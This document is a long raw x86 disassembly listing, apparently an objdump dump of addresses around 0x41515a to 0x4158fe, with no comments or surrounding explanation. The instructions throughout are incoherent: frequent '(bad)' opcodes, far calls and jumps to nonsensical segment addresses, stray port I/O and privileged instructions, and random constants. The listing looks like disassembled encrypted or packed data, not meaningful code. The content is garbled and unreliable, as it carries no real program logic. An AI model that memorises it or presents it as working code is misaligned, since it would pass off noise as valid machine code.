  41515a:	sar    BYTE PTR [esi-0x5],0x39
  41515e:	xor    edx,DWORD PTR [edx]
  415160:	lods   al,BYTE PTR ds:[esi]
  415161:	mov    ebp,DWORD PTR [eax+0x6afdefe2]
  415167:	loope  0x415191
  415169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41516a:	inc    esp
  41516b:	and    al,0x66
  41516d:	mov    eax,ds:0x18866d93
  415172:	popa   
  415173:	in     al,dx
  415174:	js     0x4151d2
  415176:	push   ss
  415177:	pop    ecx
  415178:	(bad)  [ebx]
  41517a:	rol    esp,1
  41517c:	shl    DWORD PTR [ebx],cl
  41517e:	psllw  mm1,QWORD PTR ds:0x8f359f92
  415185:	xlat   BYTE PTR ds:[ebx]
  415186:	push   esi
  415187:	xchg   ecx,eax
  415188:	mov    esi,0x324bc55e
  41518d:	clc    
  41518e:	pop    esi
  41518f:	push   ebp
  415190:	call   0x9c29:0x69bd8e1b
  415197:	cmp    al,0xe
  415199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41519a:	mov    edx,0x5e54adfd
  41519f:	push   es
  4151a0:	add    al,BYTE PTR fs:[edi-0x6c]
  4151a4:	sbb    al,0x6a
  4151a6:	xor    BYTE PTR [edx],ah
  4151a8:	sub    edx,DWORD PTR [ecx+ecx*8+0x61d0d48f]
  4151af:	sahf   
  4151b0:	sbb    edi,DWORD PTR [esi]
  4151b2:	push   cs
  4151b3:	pop    edx
  4151b4:	xchg   ecx,eax
  4151b5:	mov    esi,0x2fbcc084
  4151ba:	shl    BYTE PTR [edx+0x737384c4],0x47
  4151c1:	and    DWORD PTR [edx],ebx
  4151c3:	gs sub eax,esi
  4151c6:	xor    eax,0xddd8132e
  4151cb:	enter  0xae02,0x93
  4151cf:	and    BYTE PTR [edx],dh
  4151d1:	mov    edx,0x9972371c
  4151d6:	aam    0xaf
  4151d8:	aaa    
  4151d9:	adc    eax,0x57529e88
  4151de:	repz mov esp,0xa82e1ac9
  4151e4:	out    dx,al
  4151e5:	sbb    DWORD PTR [edx+0x55],ecx
  4151e8:	add    BYTE PTR [edx],0x3
  4151eb:	xor    eax,0x15c0deb1
  4151f0:	add    ah,BYTE PTR [edx+ecx*2+0x2f]
  4151f4:	lds    eax,FWORD PTR [ecx+edi*4-0x63]
  4151f8:	dec    esp
  4151f9:	lods   eax,DWORD PTR ds:[esi]
  4151fa:	(bad)  
  4151fb:	jmp    0x1344:0xb67ff95f
  415202:	pop    ebx
  415203:	sahf   
  415204:	popf   
  415205:	mov    ch,0x8b
  415207:	ins    BYTE PTR es:[edi],dx
  415208:	out    dx,eax
  415209:	dec    eax
  41520a:	test   DWORD PTR [ecx+ebx*4+0x24],edi
  41520e:	jmp    0x4151ec
  415210:	add    DWORD PTR [ecx+0x4b],esi
  415213:	push   ds
  415214:	cmp    al,0x2a
  415216:	xchg   ebp,eax
  415217:	retf   0x7a23
  41521a:	add    DWORD PTR [esi+0x4a902333],esp
  415220:	stc    
  415221:	push   ebp
  415222:	sbb    eax,0x98047809
  415227:	ret    0x97e5
  41522a:	sahf   
  41522b:	lds    ebx,FWORD PTR [edx]
  41522d:	fistp  QWORD PTR [ebp-0x56]
  415230:	jno    0x415259
  415232:	or     BYTE PTR [ebp-0x4414f80e],ch
  415238:	(bad)  
  415239:	sbb    al,0xae
  41523b:	mov    al,ds:0xaf00e958
  415240:	int3   
  415241:	push   esi
  415242:	clc    
  415243:	les    ebx,FWORD PTR [esi-0x48]
  415246:	jne    0x415271
  415248:	push   edx
  415249:	jmp    0x4151f0
  41524b:	mov    DWORD PTR [edi-0x2c26828d],edx
  415251:	add    ebx,esp
  415253:	jno    0x4151f2
  415255:	cmp    al,0x9a
  415257:	jne    0x415253
  415259:	dec    eax
  41525a:	sti    
  41525b:	pop    ecx
  41525c:	push   ds
  41525d:	sbb    al,0xb6
  41525f:	adc    BYTE PTR [ebx+eiz*2+0x47],bh
  415263:	enter  0x4f96,0x1e
  415267:	nop
  415268:	in     eax,0xf1
  41526a:	fist   DWORD PTR ds:0xd9c4118f
  415270:	test   BYTE PTR [esi+0xd],ah
  415273:	dec    ebx
  415274:	xchg   edx,eax
  415275:	loopne 0x4152e6
  415277:	jb     0x4152d3
  415279:	sti    
  41527a:	lods   eax,DWORD PTR ds:[esi]
  41527b:	xchg   ebp,eax
  41527c:	rol    ch,1
  41527e:	std    
  41527f:	jle    0x41523b
  415281:	mov    edx,0xf605c44
  415286:	in     eax,0x3
  415288:	aas    
  415289:	fucomp st(6)
  41528b:	(bad)  
  41528c:	sbb    BYTE PTR [ebx+esi*2],bl
  41528f:	add    al,bl
  415291:	and    edx,DWORD PTR [eax]
  415293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415294:	jle    0x4152ed
  415296:	sbb    cl,BYTE PTR [edi+0x1f]
  415299:	adc    DWORD PTR [edx-0x1b],ebp
  41529c:	jecxz  0x415260
  41529e:	push   esp
  41529f:	scas   al,BYTE PTR es:[edi]
  4152a0:	dec    edx
  4152a1:	mov    ecx,0x57dcf1a0
  4152a6:	jb     0x415283
  4152a8:	or     BYTE PTR [esi+0x23a9e95],cl
  4152ae:	mov    ebp,0xf305fc56
  4152b3:	daa    
  4152b4:	jmp    FWORD PTR [eax+edx*1]
  4152b7:	cli    
  4152b8:	out    dx,al
  4152b9:	push   ecx
  4152ba:	mov    edi,0x3b60eaca
  4152bf:	sub    eax,0x8a6bac5d
  4152c4:	ret    
  4152c5:	in     eax,0x2e
  4152c7:	pushf  
  4152c8:	les    eax,FWORD PTR [esp+ebx*1]
  4152cb:	loop   0x415276
  4152cd:	pop    es
  4152ce:	scas   eax,DWORD PTR es:[edi]
  4152cf:	les    edx,FWORD PTR [eax+eax*4+0x6a]
  4152d3:	inc    edx
  4152d4:	cmp    edi,DWORD PTR [eax-0x23]
  4152d7:	mov    bl,0x0
  4152d9:	push   ebp
  4152da:	mov    ds:0x798d7fc1,eax
  4152df:	data16 fistp DWORD PTR [edx]
  4152e2:	(bad)  
  4152e3:	pop    edx
  4152e4:	enter  0xd476,0x72
  4152e8:	push   ds
  4152e9:	clc    
  4152ea:	and    eax,0x6a38a3ef
  4152ef:	and    al,BYTE PTR ds:0xd7324c77
  4152f5:	push   edx
  4152f6:	mov    ch,0x3d
  4152f8:	mov    eax,0x2fc57172
  4152fd:	ja     0x41528a
  4152ff:	(bad)  
  415300:	jl     0x415347
  415302:	les    ebx,FWORD PTR [ecx+esi*2-0x69]
  415306:	arpl   WORD PTR [esi],bp
  415308:	cmp    al,0x5
  41530a:	retf   
  41530b:	mov    ds:0x8d0539f1,eax
  415310:	clc    
  415311:	mov    al,0x4b
  415313:	mov    ecx,0xd9c62ba4
  415318:	cwde   
  415319:	aam    0x37
  41531b:	jae    0x4152da
  41531d:	out    dx,al
  41531e:	cdq    
  41531f:	aad    0x32
  415321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415322:	cmp    BYTE PTR [ecx+0x5d4e9975],dh
  415328:	xor    DWORD PTR [edx+eax*1],edx
  41532b:	inc    esp
  41532c:	test   eax,0x6fd30236
  415331:	and    BYTE PTR [ebp-0x58],0xc9
  415335:	adc    BYTE PTR [edi+0x5f],bh
  415338:	mov    ch,ah
  41533a:	ret    
  41533b:	pop    edi
  41533c:	aad    0x13
  41533e:	jmp    0x5641:0x8ae24982
  415345:	lods   al,BYTE PTR ds:[esi]
  415346:	mul    BYTE PTR [ebp+0x62]
  415349:	or     ch,bl
  41534b:	pop    es
  41534c:	xchg   esi,eax
  41534d:	dec    ebx
  41534e:	outs   dx,DWORD PTR ds:[esi]
  41534f:	xor    eax,0xe31438a
  415354:	(bad)  
  415355:	mov    edi,0xdd73a80e
  41535a:	aam    0x79
  41535c:	add    BYTE PTR [edx-0x51b31563],0xd6
  415363:	pop    ebp
  415365:	fidivr DWORD PTR [ecx+0x7f]
  415368:	hlt    
  415369:	lods   eax,DWORD PTR ds:[esi]
  41536a:	mov    al,ds:0xeb707bce
  41536f:	fs int3 
  415371:	dec    edx
  415372:	stos   DWORD PTR es:[edi],eax
  415373:	out    dx,eax
  415374:	pushf  
  415375:	je     0x415381
  415377:	xchg   ebp,eax
  415378:	out    dx,eax
  415379:	xchg   esi,eax
  41537a:	sbb    al,0xe9
  41537c:	add    cl,dh
  41537e:	xor    DWORD PTR [edi],esp
  415380:	and    BYTE PTR [ebx-0x79],ah
  415383:	add    BYTE PTR [ecx],al
  415385:	scas   al,BYTE PTR es:[edi]
  415386:	mov    al,0xdc
  415388:	xlat   BYTE PTR ds:[ebx]
  415389:	add    DWORD PTR [ebx-0x38794a08],0x6e
  415390:	sub    ebp,esi
  415392:	lds    edi,FWORD PTR [edx]
  415394:	mov    cl,0xb5
  415396:	push   ss
  415397:	clc    
  415398:	inc    eax
  415399:	jecxz  0x415338
  41539b:	call   0xe1f3:0x41002b9a
  4153a2:	(bad)  [eax]
  4153a4:	pusha  
  4153a5:	test   al,0x6d
  4153a7:	dec    esp
  4153a8:	inc    ecx
  4153a9:	sub    al,0x82
  4153ab:	std    
  4153ac:	mul    BYTE PTR ds:0xb6725e3a
  4153b2:	sub    eax,0xa4f54f67
  4153b7:	xchg   DWORD PTR [edi+0x1a],ecx
  4153ba:	fisub  WORD PTR [ebx+0x21a15d97]
  4153c0:	jg     0x415397
  4153c2:	test   al,0xb6
  4153c4:	mov    ebp,ss
  4153c6:	sahf   
  4153c7:	nop
  4153c8:	ins    DWORD PTR es:[edi],dx
  4153c9:	and    dl,BYTE PTR [esi+eax*8+0x49ea8eba]
  4153d0:	ds xor eax,0xe402e8a2
  4153d6:	lds    esp,FWORD PTR [edi+0x43]
  4153d9:	pop    esp
  4153da:	adc    esp,ebp
  4153dc:	dec    ebp
  4153dd:	add    al,0x6a
  4153df:	add    al,0x8
  4153e1:	fsubr  DWORD PTR [eax]
  4153e3:	mov    eax,0xffff017
  4153e8:	or     al,0x6f
  4153ea:	xchg   ebx,eax
  4153eb:	push   ecx
  4153ec:	mov    esi,0xb1842e6b
  4153f2:	or     BYTE PTR [esi+0x3b],0x8d
  4153f6:	or     esi,DWORD PTR [ecx+edx*8-0x4e]
  4153fa:	mov    dh,0xc9
  4153fc:	or     ah,cl
  4153fe:	sub    esp,DWORD PTR [ecx+edi*1+0x2]
  415402:	or     BYTE PTR [ebx],ah
  415404:	dec    edi
  415405:	lods   al,BYTE PTR ds:[esi]
  415406:	inc    ebp
  415407:	loopne 0x415420
  415409:	icebp  
  41540a:	popa   
  41540b:	fmul   QWORD PTR [esi]
  41540d:	jl     0x4153c3
  41540f:	add    BYTE PTR [ebp+0x56],0x2a
  415413:	adc    eax,0xd74b6b55
  415418:	sbb    BYTE PTR [ecx-0xd779e83],cl
  41541e:	cmp    eax,0x9337ef76
  415423:	lea    eax,[edx+0x62]
  415426:	dec    ecx
  415427:	in     eax,0x71
  415429:	hlt    
  41542a:	arpl   WORD PTR [ecx+0x7e],si
  41542d:	pop    edx
  41542e:	repnz mov al,0x37
  415431:	pop    ebx
  415432:	mov    eax,0xef8d3d94
  415437:	out    0xd9,eax
  415439:	je     0x4154a5
  41543b:	dec    esp
  41543c:	cdq    
  41543d:	call   0xd63e:0x870f2c54
  415444:	push   DWORD PTR [edx-0x25]
  415447:	in     al,0x9a
  415449:	mov    eax,ds:0xbdebb5ea
  41544e:	test   BYTE PTR [ecx+ebx*4],bh
  415451:	sub    ecx,0x50
  415454:	xchg   BYTE PTR [edx+0x77450213],cl
  41545a:	(bad)  
  41545b:	cmc    
  41545c:	mov    ch,0x64
  41545e:	push   esp
  41545f:	push   edi
  415460:	ins    BYTE PTR es:[edi],dx
  415461:	jmp    0xd40da0a1
  415466:	jmp    0x4153eb
  415468:	call   0x82f83b96
  41546d:	inc    ecx
  41546e:	mov    ebx,0x22db5c7a
  415473:	xchg   edx,eax
  415474:	in     eax,0x2c
  415476:	jecxz  0x41545f
  415478:	xchg   esi,eax
  415479:	inc    edx
  41547a:	(bad)  
  41547b:	xchg   esi,eax
  41547c:	adc    DWORD PTR [edx-0x22],0xe050b996
  415483:	out    dx,eax
  415484:	ret    0x1e94
  415487:	jmp    0x4154fc
  415489:	mov    cl,0x46
  41548b:	gs pop edi
  41548d:	xchg   edi,eax
  41548e:	js     0x415496
  415490:	lea    edi,[eax+0x63]
  415493:	js     0x415513
  415495:	in     eax,dx
  415496:	lds    esi,FWORD PTR ds:0x762491dd
  41549c:	or     DWORD PTR [edx],esp
  41549e:	ret    0xb6e8
  4154a1:	and    BYTE PTR [edi],0x5
  4154a4:	in     eax,0x5c
  4154a6:	mov    ds:0xb6813398,al
  4154ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154ac:	jno    0x4154e1
  4154ae:	pop    ds
  4154af:	jb     0x4154ec
  4154b1:	push   edx
  4154b2:	jne    0x4154f1
  4154b4:	sbb    eax,0x1737f7ee
  4154b9:	or     eax,0x78c51ec6
  4154be:	sub    BYTE PTR [esp+edi*2+0x709f6dc3],bl
  4154c5:	push   ss
  4154c6:	bswap  ebp
  4154c8:	aad    0xa8
  4154ca:	stc    
  4154cb:	cs fyl2x 
  4154ce:	arpl   WORD PTR [eax+0x64e10a25],ax
  4154d4:	cmc    
  4154d5:	aas    
  4154d6:	ror    BYTE PTR [si],1
  4154d9:	mov    bl,0x75
  4154db:	jo     0x415503
  4154dd:	es jae 0x41555c
  4154e0:	daa    
  4154e1:	enter  0x3ad2,0x63
  4154e5:	popa   
  4154e6:	popf   
  4154e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154e8:	sub    al,ah
  4154ea:	rol    bh,1
  4154ec:	scas   al,BYTE PTR es:[edi]
  4154ed:	out    0x57,eax
  4154ef:	stos   BYTE PTR es:[edi],al
  4154f0:	fstp   QWORD PTR [ebx+0x6fc7643]
  4154f6:	mov    es,eax
  4154f8:	push   ss
  4154f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154fa:	les    edx,FWORD PTR [ebx]
  4154fc:	or     esp,edi
  4154fe:	jp     0x4154dc
  415500:	or     BYTE PTR [esp+edx*8-0x23],bh
  415504:	jg     0x4154e0
  415506:	cmp    ch,BYTE PTR [ebx-0x27]
  415509:	xor    DWORD PTR [ebp-0x7d],eax
  41550c:	outs   dx,BYTE PTR ds:[esi]
  41550d:	fwait
  41550e:	stos   BYTE PTR es:[edi],al
  41550f:	(bad)  
  415511:	xchg   esp,eax
  415512:	adc    al,0xab
  415514:	fcomp  DWORD PTR [ebx+0x54]
  415517:	icebp  
  415518:	and    DWORD PTR [ebx+0x36],ecx
  41551b:	dec    ebx
  41551c:	loop   0x415537
  41551e:	jp     0x4154d5
  415520:	add    bl,BYTE PTR [ebp-0x6bd7fcfc]
  415526:	dec    esp
  415527:	dec    ecx
  415528:	inc    eax
  415529:	call   0xb79bae5c
  41552e:	enter  0x7e37,0x1
  415532:	hlt    
  415533:	test   BYTE PTR [ebx-0x20],ch
  415536:	fld    DWORD PTR [eax+0x281ba6e6]
  41553c:	ret    0x2c92
  41553f:	or     esi,ebp
  415541:	xlat   BYTE PTR ds:[ebx]
  415542:	sbb    ah,cl
  415544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415545:	add    eax,0xf3fa0e6
  41554a:	aad    0xd0
  41554c:	jge    0x4154d9
  41554e:	mov    ah,0x52
  415550:	dec    ebx
  415551:	les    esi,FWORD PTR [ecx-0x6e]
  415554:	fs push esp
  415556:	jne    0x415575
  415558:	into   
  415559:	or     eax,0x449274ea
  41555e:	adc    dl,ch
  415560:	add    edx,DWORD PTR [edi+0x66c05f6e]
  415566:	jae    0x4155ba
  415568:	cwde   
  415569:	adc    BYTE PTR [edx],dl
  41556b:	or     ch,BYTE PTR [edx+0x73a2f73e]
  415571:	dec    ecx
  415572:	fidivr DWORD PTR [edi-0x28]
  415575:	pop    es
  415576:	retf   0xd71b
  415579:	enter  0x2128,0x93
  41557d:	outs   dx,DWORD PTR ds:[esi]
  41557e:	pop    edi
  41557f:	das    
  415580:	pusha  
  415581:	out    dx,eax
  415582:	sub    eax,DWORD PTR [ecx-0x78]
  415585:	loopne 0x41552f
  415587:	sub    eax,0x67645cd5
  41558c:	or     DWORD PTR [ecx+0xbdf012f],eax
  415592:	outs   dx,BYTE PTR ds:[esi]
  415593:	lods   eax,DWORD PTR ds:[esi]
  415594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415595:	imul   ebx,DWORD PTR [edi-0x4c],0x9633e2dc
  41559c:	iret   
  41559d:	(bad)  
  41559e:	xchg   esp,eax
  41559f:	test   ch,bh
  4155a1:	mov    bl,0x2b
  4155a3:	sbb    dl,bl
  4155a5:	push   ds
  4155a6:	add    al,0xa3
  4155a8:	ja     0x41558c
  4155aa:	or     sp,WORD PTR [edi+0x249d5aa]
  4155b1:	jb     0x4155ac
  4155b3:	inc    edi
  4155b4:	inc    ebp
  4155b5:	adc    al,0x8d
  4155b7:	mov    cl,0xe3
  4155b9:	cwde   
  4155ba:	int    0xbe
  4155bc:	or     bh,BYTE PTR [edx+0x58e43c24]
  4155c2:	hlt    
  4155c3:	and    cl,BYTE PTR [esp+ebx*1]
  4155c6:	jl     0x415596
  4155c8:	sbb    dh,0x8d
  4155cb:	xor    eax,0x7bdeec44
  4155d0:	xor    ebx,DWORD PTR [ebp-0x473d9b28]
  4155d6:	int    0xd5
  4155d8:	scas   al,BYTE PTR es:[edi]
  4155d9:	aas    
  4155da:	nop
  4155db:	push   ebp
  4155dc:	lods   al,BYTE PTR ds:[esi]
  4155dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155de:	mov    ebx,0x9844479d
  4155e3:	push   esp
  4155e4:	xor    al,0x13
  4155e6:	nop
  4155e7:	stos   BYTE PTR es:[edi],al
  4155e8:	fyl2xp1 
  4155ea:	lods   eax,DWORD PTR ds:[esi]
  4155eb:	mov    DWORD PTR [ebx+0x111c0478],edi
  4155f1:	sti    
  4155f2:	inc    ebx
  4155f3:	fidivr WORD PTR [ebx]
  4155f5:	sbb    dl,al
  4155f7:	pushf  
  4155f8:	push   0x21
  4155fa:	pop    ds
  4155fb:	cld    
  4155fc:	xchg   edi,eax
  4155fd:	fmul   DWORD PTR [eax-0x17]
  415600:	xchg   DWORD PTR [ecx],edi
  415602:	(bad)  
  415603:	(bad)  
  415604:	out    0xfa,eax
  415606:	mov    bl,0x17
  415608:	pop    edi
  415609:	in     al,dx
  41560a:	mov    ds:0xa217349c,al
  41560f:	and    al,0xa0
  415611:	repz pop eax
  415613:	mov    bh,0x9
  415615:	mov    ebp,0xf4b36e33
  41561a:	mov    eax,0x16865716
  41561f:	or     dl,BYTE PTR [edx-0x15]
  415622:	in     al,dx
  415623:	pop    esi
  415624:	xchg   BYTE PTR [ebx],ah
  415626:	mov    ecx,0x3d5c3224
  41562b:	mov    edi,0x4c4f01c3
  415630:	push   ebp
  415631:	mov    ds:0x23999899,eax
  415636:	mov    ds:0x6454986c,al
  41563b:	ret    0xbb26
  41563e:	data16 or BYTE PTR [esi+0x54],cl
  415642:	pushf  
  415643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415644:	mov    edi,0x7fcd972f
  415649:	jne    0x415658
  41564b:	push   ds
  41564c:	mov    ecx,0x910d77d6
  415651:	add    cl,BYTE PTR [edx-0x165609d5]
  415657:	adc    eax,0x4ea5f768
  41565c:	pop    edx
  41565d:	push   ebx
  41565e:	mov    bh,0xc6
  415660:	mov    cl,0x7c
  415662:	shl    DWORD PTR [ebx+ecx*8+0x35],cl
  415666:	cmc    
  415667:	jecxz  0x415680
  415669:	std    
  41566a:	inc    ecx
  41566b:	test   DWORD PTR [esi],ebx
  41566d:	xchg   DWORD PTR ds:[edi-0x1ad88af7],edi
  415674:	ins    DWORD PTR es:[edi],dx
  415675:	mov    bl,0x76
  415677:	mov    esp,0x248f99ff
  41567c:	iret   
  41567d:	sbb    ebx,DWORD PTR [esi]
  41567f:	in     al,0xa2
  415681:	retf   
  415682:	mov    WORD PTR [ebp+ebp*4-0x23],cs
  415686:	cmc    
  415687:	and    eax,DWORD PTR [edx+0x32729076]
  41568d:	repz or ah,BYTE PTR [ecx+eiz*2+0x543d9360]
  415695:	rol    ah,1
  415697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415698:	jb     0x415681
  41569a:	mov    DWORD PTR [esi],edx
  41569c:	and    DWORD PTR ds:0x831fb676,0xffffffd0
  4156a3:	pop    ss
  4156a4:	ins    DWORD PTR es:[edi],dx
  4156a5:	pop    ebx
  4156a6:	push   edi
  4156a7:	inc    ebp
  4156a8:	ret    
  4156a9:	lea    esi,[edi+edx*4-0x2f43f79f]
  4156b0:	inc    eax
  4156b1:	fmulp  st(0),st
  4156b3:	jp     0x415638
  4156b5:	mov    ecx,0x620b4e21
  4156ba:	adc    DWORD PTR [ecx],0xffffff8e
  4156bd:	pop    ds
  4156be:	push   eax
  4156bf:	mov    bh,0xc1
  4156c1:	dec    esi
  4156c2:	and    edx,DWORD PTR [edi]
  4156c4:	push   edx
  4156c5:	(bad)  
  4156c7:	fsubr  QWORD PTR [edi+0x23]
  4156ca:	in     al,dx
  4156cb:	mov    eax,ds:0x817c7b0f
  4156d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156d1:	ins    DWORD PTR es:[edi],dx
  4156d2:	test   eax,0xc52e0d92
  4156d7:	xlat   BYTE PTR ds:[ebx]
  4156d8:	mov    eax,0x3aa6aa2d
  4156dd:	mov    ecx,ecx
  4156df:	nop
  4156e0:	into   
  4156e1:	arpl   WORD PTR [esi],bp
  4156e3:	dec    esp
  4156e4:	lds    edx,FWORD PTR [edi-0x1b8349fb]
  4156ea:	shl    bh,1
  4156ec:	fisubr DWORD PTR [esp+edi*1]
  4156ef:	mov    cl,0x4e
  4156f1:	lahf   
  4156f2:	push   es
  4156f3:	out    dx,al
  4156f4:	inc    eax
  4156f5:	or     eax,0x58a3a58
  4156fa:	in     eax,0xbf
  4156fc:	mov    bh,0xe4
  4156fe:	xchg   ebp,eax
  4156ff:	inc    esp
  415700:	fadd   DWORD PTR [eax+0x10]
  415703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415704:	mov    bl,0x63
  415706:	pop    es
  415707:	and    ch,dh
  415709:	(bad)  
  41570b:	stos   BYTE PTR es:[edi],al
  41570c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41570d:	fistp  WORD PTR [ecx+0xab73253]
  415713:	cmp    DWORD PTR [esi+0x5fba9cfb],edi
  415719:	push   DWORD PTR [eax]
  41571b:	mov    cl,0xff
  41571d:	les    edx,FWORD PTR [edi]
  41571f:	mov    ebx,0xe0a33214
  415724:	adc    bl,BYTE PTR [edx+0x71]
  415727:	jb     0x4156fe
  415729:	sbb    BYTE PTR [eax],dh
  41572b:	cmp    BYTE PTR fs:[ebx+0x1526d8a9],0x3
  415733:	shr    BYTE PTR [edx],cl
  415735:	je     0x4157a2
  415737:	in     al,dx
  415738:	add    eax,0x4cb097ac
  41573d:	rcl    BYTE PTR [eax-0x5f],0xfa
  415741:	loope  0x41571e
  415743:	add    al,BYTE PTR [eax+0x49f5b84c]
  415749:	mov    esp,0x4723bde6
  41574e:	inc    ebp
  41574f:	jbe    0x4157d0
  415751:	pop    es
  415752:	mov    al,ds:0x21908594
  415757:	in     al,0x28
  415759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41575a:	test   esp,ebx
  41575c:	cwde   
  41575d:	jne    0x4157c6
  41575f:	sbb    edi,0xffffffb3
  415762:	mov    eax,0x8b36c3b8
  415767:	sub    BYTE PTR [edi+0x7fb32be3],0x1e
  41576e:	cmc    
  41576f:	test   eax,0x32cfe9ce
  415774:	cdq    
  415775:	xchg   edx,eax
  415776:	lds    ecx,FWORD PTR [ebp-0x5c]
  415779:	sub    al,0xf4
  41577b:	cwde   
  41577c:	fsubp  st(1),st
  41577e:	sbb    BYTE PTR [ebx-0x7f],bh
  415781:	(bad)  
  415783:	xchg   esp,eax
  415784:	jmp    FWORD PTR [edi+0x2c34f6d1]
  41578a:	cs sub ebx,esi
  41578d:	test   eax,0xae6d0c2f
  415792:	or     dh,BYTE PTR [edi]
  415794:	frstor [esi-0x515c3afd]
  41579a:	fsubp  st(4),st
  41579c:	mov    bl,0x9
  41579e:	add    al,0x6d
  4157a0:	aaa    
  4157a1:	mul    DWORD PTR [esi]
  4157a3:	imul   edi,DWORD PTR [edi-0x70],0x353ebd97
  4157aa:	mul    DWORD PTR [esi+0x2]
  4157ad:	lea    ecx,[esi+0x25]
  4157b0:	adc    al,0x76
  4157b2:	mov    eax,0x9169e93f
  4157b7:	ja     0x415775
  4157b9:	pop    edx
  4157ba:	pop    ecx
  4157bb:	sub    al,0x6d
  4157bd:	lahf   
  4157be:	loope  0x415801
  4157c0:	mov    dh,0xa2
  4157c2:	outs   dx,BYTE PTR ds:[esi]
  4157c3:	push   ds
  4157c4:	test   ah,al
  4157c6:	mov    ch,0xaa
  4157c8:	cmp    ah,BYTE PTR [ecx+0x164458e2]
  4157ce:	mov    ebx,DWORD PTR [edx-0x36689c01]
  4157d4:	mov    esi,0xe825bc5
  4157d9:	mov    ds:0x2ac126c0,al
  4157de:	xchg   edx,eax
  4157df:	adc    ebx,eax
  4157e1:	add    al,0x4d
  4157e3:	cs mov dl,0xfe
  4157e6:	jg     0x4157e9
  4157e8:	mov    esp,0x276ad0eb
  4157ed:	xchg   ecx,eax
  4157ee:	add    dl,dh
  4157f0:	mov    ecx,0xf469a012
  4157f5:	leave  
  4157f6:	jo     0x4157cc
  4157f8:	inc    ecx
  4157f9:	daa    
  4157fa:	mov    ecx,0x453a5950
  4157ff:	inc    edi
  415800:	jmp    0x415870
  415802:	cmc    
  415803:	lock (bad) 
  415805:	or     bl,BYTE PTR [edx]
  415807:	inc    ebx
  415808:	and    eax,0x210f5681
  41580d:	call   ebx
  41580f:	out    0x9b,al
  415811:	xor    ebp,0xd43e8650
  415817:	jle    0x4157c8
  415819:	daa    
  41581a:	int3   
  41581b:	gs push eax
  41581d:	push   ecx
  41581e:	push   ebp
  41581f:	fbld   TBYTE PTR [eax+eiz*1+0x70d72c0e]
  415826:	xchg   ecx,eax
  415827:	icebp  
  415828:	jns    0x4157d8
  41582a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41582b:	cli    
  41582c:	dec    ebx
  41582d:	out    0xb5,al
  41582f:	cmp    ebp,esp
  415831:	cmp    BYTE PTR [ebx-0xb],ch
  415834:	sbb    BYTE PTR [edx+0x5f4678c],cl
  41583a:	jo     0x4157df
  41583c:	out    dx,al
  41583d:	or     al,0xc8
  41583f:	or     edx,esi
  415841:	push   0x63bd8871
  415846:	jmp    0x4157f6
  415848:	sbb    ebx,DWORD PTR [eax+0xa]
  41584b:	mov    al,0x95
  41584d:	xchg   bh,dl
  41584f:	into   
  415850:	adc    ebx,DWORD PTR [ecx]
  415852:	aam    0xd3
  415854:	inc    edi
  415855:	adc    ecx,esp
  415857:	sbb    esi,DWORD PTR [ecx]
  415859:	dec    ebp
  41585a:	xor    BYTE PTR [eax-0x40],bl
  41585d:	jl     0x415832
  41585f:	out    dx,al
  415860:	mov    esp,0xc617e75
  415865:	fcomi  st,st(6)
  415867:	and    eax,0x8b6ad372
  41586c:	ins    DWORD PTR es:[edi],dx
  41586d:	xchg   edi,eax
  41586e:	shl    DWORD PTR [edi+0x2f],1
  415871:	mov    ebx,0x9b178943
  415876:	int    0xd0
  415878:	call   0x1f1d5093
  41587d:	test   eax,0xee39970e
  415882:	add    al,0xf0
  415884:	shr    BYTE PTR [eax+0x7f],cl
  415887:	ret    
  415888:	adc    BYTE PTR [ecx+ecx*8-0x490795f1],al
  41588f:	in     eax,0x9a
  415891:	mov    cl,0x78
  415893:	add    eax,0xe4747024
  415898:	mov    eax,ds:0x7c4dd723
  41589d:	pop    ebp
  41589e:	arpl   WORD PTR [ebx],bp
  4158a0:	xor    bl,dl
  4158a2:	sub    BYTE PTR [edx+0x74],dh
  4158a5:	(bad)  
  4158a6:	mov    BYTE PTR [ebx+0x3d],bl
  4158a9:	pop    ebx
  4158aa:	sub    BYTE PTR [eax+0x70],ah
  4158ad:	jp     0x415905
  4158af:	fld    DWORD PTR [ebp-0x4e5347ea]
  4158b5:	push   edi
  4158b6:	and    al,0x23
  4158b8:	inc    edx
  4158b9:	adc    ecx,ebx
  4158bb:	dec    ebx
  4158bc:	xchg   ecx,eax
  4158bd:	pop    ds
  4158be:	dec    ebp
  4158bf:	dec    ebp
  4158c0:	clc    
  4158c1:	sar    DWORD PTR [ecx+0x3a],cl
  4158c4:	(bad)  
  4158c5:	shr    BYTE PTR [eax],cl
  4158c7:	sbb    DWORD PTR [edi-0x3a],esi
  4158ca:	test   BYTE PTR [esi+0x1a],bh
  4158cd:	int    0x3b
  4158cf:	je     0x415881
  4158d1:	sti    
  4158d2:	jb     0x4158b9
  4158d4:	ins    BYTE PTR es:[edi],dx
  4158d5:	jns    0x4158c5
  4158d7:	lock mov bh,0x4a
  4158da:	xchg   ebx,eax
  4158db:	daa    
  4158dc:	addr16 dec edi
  4158de:	inc    edx
  4158df:	xor    al,0xb4
  4158e1:	dec    eax
  4158e2:	jp     0x415891
  4158e4:	ss std 
  4158e6:	rcr    DWORD PTR [ebp+0x5177d13d],0x36
  4158ed:	and    ch,BYTE PTR [ebp+0x35]
  4158f0:	add    eax,0x2ed21297
  4158f5:	ds aaa 
  4158f7:	shl    BYTE PTR [eax+0x19d482e1],cl
  4158fd:	stos   DWORD PTR es:[edi],eax
  4158fe:	bound  ebp,QWORD PTR [esi-0x63de0933]
